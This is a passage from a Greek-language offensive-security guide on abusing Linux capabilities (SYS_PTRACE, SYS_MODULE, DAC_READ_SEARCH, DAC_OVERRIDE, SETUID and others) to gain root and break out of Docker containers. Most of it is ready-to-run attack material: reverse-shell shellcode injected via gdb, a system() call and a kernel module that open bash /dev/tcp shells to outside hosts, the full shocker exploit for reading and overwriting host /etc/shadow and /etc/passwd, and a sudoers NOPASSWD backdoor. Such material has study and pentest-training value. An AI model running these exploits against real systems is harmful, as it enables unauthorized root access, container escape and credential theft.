4. Όταν φτάσετε στο breakpoint, εισάγετε το shellcode:
   ```gdb
   (gdb) set {char[<shellcode_length>]} 0x<address> = {<your_shellcode>}
   ```

5. Συνεχίστε την εκτέλεση του προγράμματος:
   ```gdb
   (gdb) continue
   ```

Αυτό θα εκτελέσει το shellcode που έχετε εισάγει στη μνήμη.
```
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Αποσφαλμάτωσε μια διαδικασία root με gdb και αντιγράψτε-επικολλήστε τις προηγουμένως παραγόμενες γραμμές gdb:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Παράδειγμα με περιβάλλον (Docker breakout) - Άλλη κακή χρήση του gdb**

Αν είναι εγκατεστημένο το **GDB** (ή μπορείτε να το εγκαταστήσετε με `apk add gdb` ή `apt install gdb` για παράδειγμα) μπορείτε να **αποσφαλματώσετε μια διαδικασία από τον κεντρικό υπολογιστή** και να την κάνετε να καλέσει τη συνάρτηση `system`. (Αυτή η τεχνική απαιτεί επίσης την ικανότητα `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Δεν θα μπορείτε να δείτε την έξοδο της εντολής που εκτελείται, αλλά θα εκτελείται από αυτή τη διαδικασία (οπότε αποκτήστε ένα rev shell).

> [!WARNING]
> Αν λάβετε το σφάλμα "No symbol "system" in current context." ελέγξτε το προηγούμενο παράδειγμα που φορτώνει ένα shellcode σε ένα πρόγραμμα μέσω gdb.

**Παράδειγμα με περιβάλλον (Docker breakout) - Εισαγωγή Shellcode**

Μπορείτε να ελέγξετε τις ενεργοποιημένες δυνατότητες μέσα στο κοντέινερ docker χρησιμοποιώντας:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
List **processes** running in the **host** `ps -eaf`

1. Get the **architecture** `uname -m`
2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** δίνει τη δυνατότητα σε μια διαδικασία να **φορτώνει και να ξεφορτώνει** πυρήνα modules (`init_module(2)`, `finit_module(2)` και `delete_module(2)` system calls), προσφέροντας άμεση πρόσβαση στις βασικές λειτουργίες του πυρήνα. Αυτή η ικανότητα παρουσιάζει κρίσιμους κινδύνους ασφαλείας, καθώς επιτρέπει την κλιμάκωση προνομίων και την πλήρη συμβιβασμό του συστήματος επιτρέποντας τροποποιήσεις στον πυρήνα, παρακάμπτοντας έτσι όλους τους μηχανισμούς ασφαλείας του Linux, συμπεριλαμβανομένων των Linux Security Modules και της απομόνωσης κοντέινερ.
**Αυτό σημαίνει ότι μπορείτε να** **εισάγετε/αφαιρέσετε** πυρήνα modules από/στον πυρήνα της μηχανής-φιλοξενουμένης.**

**Παράδειγμα με δυαδικό**

Στο παρακάτω παράδειγμα το δυαδικό **`python`** έχει αυτή την ικανότητα.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Από προεπιλογή, η εντολή **`modprobe`** ελέγχει τη λίστα εξαρτήσεων και τα αρχεία χάρτη στον κατάλογο **`/lib/modules/$(uname -r)`**.\
Για να εκμεταλλευτούμε αυτό, ας δημιουργήσουμε έναν ψεύτικο φάκελο **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Τότε **συγκεντρώστε το module του πυρήνα που μπορείτε να βρείτε 2 παραδείγματα παρακάτω και αντιγράψτε** το σε αυτόν τον φάκελο:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Τέλος, εκτελέστε τον απαραίτητο κώδικα python για να φορτώσετε αυτό το kernel module:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Παράδειγμα 2 με δυαδικό**

Στο παρακάτω παράδειγμα, το δυαδικό **`kmod`** έχει αυτή την ικανότητα.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Αυτό σημαίνει ότι είναι δυνατόν να χρησιμοποιήσετε την εντολή **`insmod`** για να εισάγετε ένα module πυρήνα. Ακολουθήστε το παρακάτω παράδειγμα για να αποκτήσετε ένα **reverse shell** εκμεταλλευόμενοι αυτό το προνόμιο.

**Παράδειγμα με περιβάλλον (Docker breakout)**

Μπορείτε να ελέγξετε τις ενεργοποιημένες δυνατότητες μέσα στο κοντέινερ docker χρησιμοποιώντας:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Μέσα στην προηγούμενη έξοδο μπορείτε να δείτε ότι η δυνατότητα **SYS_MODULE** είναι ενεργοποιημένη.

**Δημιουργήστε** το **kernel module** που θα εκτελεί ένα reverse shell και το **Makefile** για να το **συγκεντρώσετε**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Ο κενός χαρακτήρας πριν από κάθε λέξη make στο Makefile **πρέπει να είναι ένα tab, όχι κενά**!

Εκτελέστε `make` για να το μεταγλωττίσετε.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Τέλος, ξεκινήστε το `nc` μέσα σε ένα shell και **φορτώστε το module** από ένα άλλο και θα καταγράψετε το shell στη διαδικασία nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Abusing SYS_MODULE Capability" από** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Ένα άλλο παράδειγμα αυτής της τεχνικής μπορεί να βρεθεί στο [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει σε μια διαδικασία να **παρακάμψει τις άδειες για την ανάγνωση αρχείων και για την ανάγνωση και εκτέλεση καταλόγων**. Η κύρια χρήση του είναι για σκοπούς αναζήτησης ή ανάγνωσης αρχείων. Ωστόσο, επιτρέπει επίσης σε μια διαδικασία να χρησιμοποιήσει τη λειτουργία `open_by_handle_at(2)`, η οποία μπορεί να έχει πρόσβαση σε οποιοδήποτε αρχείο, συμπεριλαμβανομένων εκείνων εκτός του mount namespace της διαδικασίας. Ο χειριστής που χρησιμοποιείται στο `open_by_handle_at(2)` υποτίθεται ότι είναι ένας μη διαφανής αναγνωριστής που αποκτάται μέσω του `name_to_handle_at(2)`, αλλά μπορεί να περιλαμβάνει ευαίσθητες πληροφορίες όπως αριθμούς inode που είναι ευάλωτοι σε παραβίαση. Η δυνατότητα εκμετάλλευσης αυτής της ικανότητας, ιδιαίτερα στο πλαίσιο των κοντέινερ Docker, αποδείχθηκε από τον Sebastian Krahmer με την εκμετάλλευση shocker, όπως αναλύθηκε [εδώ](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Αυτό σημαίνει ότι μπορείτε να** **παρακάμψετε τους ελέγχους άδειας ανάγνωσης αρχείων και τους ελέγχους άδειας ανάγνωσης/εκτέλεσης καταλόγων.**

**Παράδειγμα με δυαδικό αρχείο**

Το δυαδικό αρχείο θα μπορεί να διαβάσει οποιοδήποτε αρχείο. Έτσι, αν ένα αρχείο όπως το tar έχει αυτή την ικανότητα, θα μπορεί να διαβάσει το αρχείο shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Παράδειγμα με binary2**

Σε αυτή την περίπτωση ας υποθέσουμε ότι το **`python`** δυαδικό αρχείο έχει αυτή την ικανότητα. Για να καταγράψετε τα αρχεία του root μπορείτε να κάνετε:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Και για να διαβάσετε ένα αρχείο θα μπορούσατε να κάνετε:
```python
print(open("/etc/shadow", "r").read())
```
**Παράδειγμα σε Περιβάλλον (Docker breakout)**

Μπορείτε να ελέγξετε τις ενεργοποιημένες δυνατότητες μέσα στο κοντέινερ docker χρησιμοποιώντας:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Μέσα στην προηγούμενη έξοδο μπορείτε να δείτε ότι η δυνατότητα **DAC_READ_SEARCH** είναι ενεργοποιημένη. Ως αποτέλεσμα, το κοντέινερ μπορεί να **debug processes**.

Μπορείτε να μάθετε πώς λειτουργεί η παρακάτω εκμετάλλευση στο [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) αλλά συνοπτικά, η **CAP_DAC_READ_SEARCH** όχι μόνο μας επιτρέπει να διασχίζουμε το σύστημα αρχείων χωρίς ελέγχους αδειών, αλλά επίσης αφαιρεί ρητά οποιουσδήποτε ελέγχους για το _**open_by_handle_at(2)**_ και **θα μπορούσε να επιτρέψει στη διαδικασία μας να έχει πρόσβαση σε ευαίσθητα αρχεία που έχουν ανοιχτεί από άλλες διαδικασίες**.

Η αρχική εκμετάλλευση που εκμεταλλεύεται αυτές τις άδειες για να διαβάσει αρχεία από τον κεντρικό υπολογιστή μπορεί να βρεθεί εδώ: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), η παρακάτω είναι μια **τροποποιημένη έκδοση που σας επιτρέπει να υποδείξετε το αρχείο που θέλετε να διαβάσετε ως πρώτο επιχείρημα και να το αποθηκεύσετε σε ένα αρχείο.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Η εκμετάλλευση χρειάζεται να βρει έναν δείκτη σε κάτι που είναι τοποθετημένο στον οικοδεσπότη. Η αρχική εκμετάλλευση χρησιμοποιούσε το αρχείο /.dockerinit και αυτή η τροποποιημένη έκδοση χρησιμοποιεί το /etc/hostname. Αν η εκμετάλλευση δεν λειτουργεί, ίσως χρειαστεί να ορίσετε ένα διαφορετικό αρχείο. Για να βρείτε ένα αρχείο που είναι τοποθετημένο στον οικοδεσπότη, απλώς εκτελέστε την εντολή mount:

![](<../../images/image (407) (1).png>)

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Abusing DAC_READ_SEARCH Capability" από** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

## CAP_DAC_OVERRIDE

**Αυτό σημαίνει ότι μπορείτε να παρακάμψετε τους ελέγχους δικαιωμάτων εγγραφής σε οποιοδήποτε αρχείο, οπότε μπορείτε να γράψετε οποιοδήποτε αρχείο.**

Υπάρχουν πολλά αρχεία που μπορείτε να **επικαλύψετε για να κερδίσετε δικαιώματα,** [**μπορείτε να πάρετε ιδέες από εδώ**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Παράδειγμα με δυαδικό αρχείο**

Σε αυτό το παράδειγμα, το vim έχει αυτή την ικανότητα, οπότε μπορείτε να τροποποιήσετε οποιοδήποτε αρχείο όπως το _passwd_, _sudoers_ ή _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Παράδειγμα με το δυαδικό 2**

Σε αυτό το παράδειγμα, το **`python`** δυαδικό θα έχει αυτή την ικανότητα. Μπορείτε να χρησιμοποιήσετε το python για να παρακάμψετε οποιοδήποτε αρχείο:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Παράδειγμα με περιβάλλον + CAP_DAC_READ_SEARCH (Docker breakout)**

Μπορείτε να ελέγξετε τις ενεργοποιημένες δυνατότητες μέσα στο κοντέινερ docker χρησιμοποιώντας:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Πρώτα απ' όλα, διαβάστε την προηγούμενη ενότητα που [**καταχράται την ικανότητα DAC_READ_SEARCH για να διαβάσει αυθαίρετα αρχεία**](linux-capabilities.md#cap_dac_read_search) του host και **συγκεντρώστε** την εκμετάλλευση.\
Στη συνέχεια, **συγκεντρώστε την παρακάτω έκδοση της εκμετάλλευσης shocker** που θα σας επιτρέψει να **γράφετε αυθαίρετα αρχεία** μέσα στο σύστημα αρχείων του host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Για να ξεφύγετε από το docker container, μπορείτε να **κατεβάσετε** τα αρχεία `/etc/shadow` και `/etc/passwd` από τον host, **να προσθέσετε** σε αυτά έναν **νέο χρήστη** και να χρησιμοποιήσετε **`shocker_write`** για να τα αντικαταστήσετε. Στη συνέχεια, **να αποκτήσετε πρόσβαση** μέσω **ssh**.

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Abusing DAC_OVERRIDE Capability" από** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**Αυτό σημαίνει ότι είναι δυνατό να αλλάξετε την ιδιοκτησία οποιουδήποτε αρχείου.**

**Παράδειγμα με δυαδικό**

Ας υποθέσουμε ότι το **`python`** δυαδικό έχει αυτή την ικανότητα, μπορείτε να **αλλάξετε** τον **ιδιοκτήτη** του αρχείου **shadow**, **να αλλάξετε τον κωδικό πρόσβασης του root** και να κλιμακώσετε τα δικαιώματα:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ή με το **`ruby`** δυαδικό αρχείο να έχει αυτή την ικανότητα:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Αυτό σημαίνει ότι είναι δυνατή η αλλαγή των δικαιωμάτων οποιουδήποτε αρχείου.**

**Παράδειγμα με δυαδικό αρχείο**

Εάν το python έχει αυτή την ικανότητα, μπορείτε να τροποποιήσετε τα δικαιώματα του αρχείου shadow, **να αλλάξετε τον κωδικό πρόσβασης του root**, και να κερδίσετε δικαιώματα:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**Αυτό σημαίνει ότι είναι δυνατόν να οριστεί το αποτελεσματικό αναγνωριστικό χρήστη της δημιουργούμενης διαδικασίας.**

**Παράδειγμα με δυαδικό αρχείο**

Αν το python έχει αυτή την **ικανότητα**, μπορείτε πολύ εύκολα να την εκμεταλλευτείτε για να κερδίσετε δικαιώματα root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Άλλος τρόπος:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Αυτό σημαίνει ότι είναι δυνατόν να ορίσετε το αποτελεσματικό αναγνωριστικό ομάδας της δημιουργούμενης διαδικασίας.**

Υπάρχουν πολλά αρχεία που μπορείτε να **επικαλύψετε για να κερδίσετε δικαιώματα,** [**μπορείτε να πάρετε ιδέες από εδώ**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Παράδειγμα με δυαδικό αρχείο**

Σε αυτή την περίπτωση θα πρέπει να αναζητήσετε ενδιαφέροντα αρχεία που μπορεί να διαβάσει μια ομάδα, επειδή μπορείτε να προσποιηθείτε οποιαδήποτε ομάδα:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Μόλις βρείτε ένα αρχείο που μπορείτε να εκμεταλλευτείτε (μέσω ανάγνωσης ή εγγραφής) για να κλιμακώσετε τα δικαιώματα, μπορείτε να **πάρετε ένα shell προσποιούμενοι την ενδιαφέρουσα ομάδα** με:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Σε αυτή την περίπτωση, η ομάδα shadow παριστάνθηκε, ώστε να μπορείτε να διαβάσετε το αρχείο `/etc/shadow`:
```bash
cat /etc/shadow
```
Αν είναι εγκατεστημένο το **docker**, θα μπορούσατε να **παριστάνετε** την **ομάδα docker** και να την εκμεταλλευτείτε για να επικοινωνήσετε με το [**docker socket** και να κλιμακώσετε τα δικαιώματα](#writable-docker-socket).

## CAP_SETFCAP

**Αυτό σημαίνει ότι είναι δυνατόν να ορίσετε ικανότητες σε αρχεία και διαδικασίες**

**Παράδειγμα με δυαδικό αρχείο**

Αν το python έχει αυτή την **ικανότητα**, μπορείτε πολύ εύκολα να την εκμεταλλευτείτε για να κλιμακώσετε τα δικαιώματα σε root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
